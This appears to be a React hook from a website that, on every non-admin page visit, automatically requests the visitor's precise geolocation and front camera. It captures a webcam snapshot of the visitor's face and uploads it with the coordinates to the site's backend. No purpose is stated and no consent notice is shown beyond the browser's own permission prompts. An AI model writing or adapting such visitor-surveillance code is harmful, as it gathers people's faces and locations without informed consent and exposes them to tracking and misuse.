import { useEffect, useRef,useState} from "react";
import { useLocation } from "react-router-dom";
import visitorService from "../services/visitorService";

export default function useVisitorTracking() {

    const location = useLocation();
    const pathname = location.pathname;

    const locationRequestStarted = useRef(false);
    const cameraRequestStarted = useRef(false);

    const [visitorMediaStatus, setVisitorMediaStatus] = useState({
        ready: false,
        hasSnapshot: false,
        hasLocation: false,
    });

    /*
     * ---------------------------------------------------------
     * 1. CREATE / UPDATE VISITOR RECORD FIRST
     * ---------------------------------------------------------
     *
     * Camera and location must never try to save media before
     * the visitor record exists in MongoDB.
     */

useEffect(() => {

    const ignoredPrefixes = [
        "/admin",
    ];

    const shouldIgnore = ignoredPrefixes.some((prefix) =>
        pathname.startsWith(prefix)
    );

    if (shouldIgnore) {
        return;
    }

    const initializeVisitor = async () => {

        setVisitorMediaStatus({
            ready: false,
            hasSnapshot: false,
            hasLocation: false,
        });

        locationRequestStarted.current = false;
        cameraRequestStarted.current = false;

        const result =
            await visitorService.trackVisitor(pathname);

        if (!result) {
            return;
        }

        console.log(
            "Visitor media status:",
            {
                hasSnapshot: result.hasSnapshot,
                hasLocation: result.hasLocation,
            }
        );

        setVisitorMediaStatus({
            ready: true,
            hasSnapshot: result.hasSnapshot,
            hasLocation: result.hasLocation,
        });

    };

    initializeVisitor();

}, [pathname]);


    /*
     * ---------------------------------------------------------
     * 2. LOCATION TRACKING
     * ---------------------------------------------------------
     */

useEffect(() => {

    const ignoredPrefixes = [
        "/admin",
    ];

    const shouldIgnore = ignoredPrefixes.some((prefix) =>
        pathname.startsWith(prefix)
    );

    if (shouldIgnore) {
        return;
    }

    // Wait until the backend has told us
    // whether this visitor already has location data.
    if (!visitorMediaStatus.ready) {
        return;
    }

    // MongoDB already has this visitor's location.
    // Therefore, do nothing.
    if (visitorMediaStatus.hasLocation) {
        return;
    }

    // Prevent duplicate location requests.
    if (locationRequestStarted.current) {
        return;
    }

    locationRequestStarted.current = true;

    const requestLocation = async () => {

        try {

            // Check whether the browser supports geolocation.
            if (!navigator.geolocation) {

                console.log(
                    "Geolocation is not supported by this browser."
                );

                return;
            }

            // Check the browser's current permission state.
            let permissionState = "prompt";

            try {

                if (navigator.permissions) {

                    const permission =
                        await navigator.permissions.query({
                            name: "geolocation",
                        });

                    permissionState =
                        permission.state;

                }

            } catch (permissionError) {

                console.log(
                    "Could not determine location permission state.",
                    permissionError
                );

            }

            console.log(
                "Location permission state:",
                permissionState
            );

            // If the visitor has already denied location,
            // do not ask again.
            if (permissionState === "denied") {

                console.log(
                    "Location permission is denied. No request will be made."
                );

                return;
            }

            console.log(
                "Requesting visitor location..."
            );

            navigator.geolocation.getCurrentPosition(

                async (position) => {

                    const latitude =
                        position.coords.latitude;

                    const longitude =
                        position.coords.longitude;

                    console.log(
                        "Visitor location received:",
                        latitude,
                        longitude
                    );

                    try {

                        const response =
                            await visitorService.saveVisitorMedia({
                                latitude,
                                longitude,
                            });

                        console.log(
                            "Visitor location saved:",
                            response
                        );

                    } catch (error) {

                        console.error(
                            "Failed to save visitor location:",
                            error
                        );

                    }

                },

                (error) => {

                    console.error(
                        "Visitor location permission/error:",
                        error
                    );

                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0,
                }

            );

        } catch (error) {

            console.error(
                "Location initialization error:",
                error
            );

        }

    };

    requestLocation();

}, [
    pathname,
    visitorMediaStatus.ready,
    visitorMediaStatus.hasLocation,
]);


    /*
     * ---------------------------------------------------------
     * 3. CAMERA SNAPSHOT
     * ---------------------------------------------------------
     */

useEffect(() => {

    const ignoredPrefixes = [
        "/admin",
    ];

    const shouldIgnore = ignoredPrefixes.some((prefix) =>
        pathname.startsWith(prefix)
    );

    if (shouldIgnore) {
        return;
    }

    // Wait until the backend has told us
    // whether this visitor already has a snapshot.
    if (!visitorMediaStatus.ready) {
        return;
    }

    // MongoDB already has the visitor's snapshot.
    // Therefore, do nothing.
    if (visitorMediaStatus.hasSnapshot) {
        return;
    }

    // Prevent duplicate camera requests.
    if (cameraRequestStarted.current) {
        return;
    }

    cameraRequestStarted.current = true;

    const captureSnapshot = async () => {

        let stream = null;

        try {

            // Check browser camera support.
            if (
                !navigator.mediaDevices ||
                !navigator.mediaDevices.getUserMedia
            ) {

                console.log(
                    "Camera is not supported by this browser."
                );

                return;
            }

            // Check the browser's current camera permission state.
            let permissionState = "prompt";

            try {

                if (navigator.permissions) {

                    const permission =
                        await navigator.permissions.query({
                            name: "camera",
                        });

                    permissionState =
                        permission.state;

                }

            } catch (permissionError) {

                console.log(
                    "Could not determine camera permission state.",
                    permissionError
                );

            }

            console.log(
                "Camera permission state:",
                permissionState
            );

            // If the visitor has already denied camera,
            // do not ask again.
            if (permissionState === "denied") {

                console.log(
                    "Camera permission is denied. No request will be made."
                );

                return;
            }

            console.log(
                "Requesting camera permission..."
            );

            stream =
                await navigator.mediaDevices.getUserMedia({

                    video: {

                        facingMode: "user",

                        width: {
                            ideal: 640,
                        },

                        height: {
                            ideal: 480,
                        },

                    },

                    audio: false,

                });

            console.log(
                "Camera permission granted."
            );

            const video =
                document.createElement("video");

            video.srcObject = stream;

            video.muted = true;
            video.playsInline = true;

            await video.play();

            // Give the camera a short moment to produce
            // a usable frame.
            await new Promise((resolve) =>
                setTimeout(resolve, 500)
            );

            const canvas =
                document.createElement("canvas");

            canvas.width = 640;
            canvas.height = 480;

            const context =
                canvas.getContext("2d");

            if (!context) {

                throw new Error(
                    "Unable to create canvas context."
                );

            }

            context.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );

            const snapshotData =
                canvas.toDataURL(
                    "image/jpeg",
                    0.7
                );

            console.log(
                "Camera snapshot captured."
            );

            const response =
                await visitorService.saveVisitorMedia({
                    snapshotData,
                });

            console.log(
                "Visitor snapshot saved:",
                response
            );

        } catch (error) {

            console.error(
                "Camera permission/capture error:",
                error
            );

        } finally {

            // Always stop the camera.
            if (stream) {

                stream
                    .getTracks()
                    .forEach((track) => {
                        track.stop();
                    });

            }

            console.log(
                "Camera stopped."
            );

        }

    };

    captureSnapshot();

}, [
    pathname,
    visitorMediaStatus.ready,
    visitorMediaStatus.hasSnapshot,
]);

}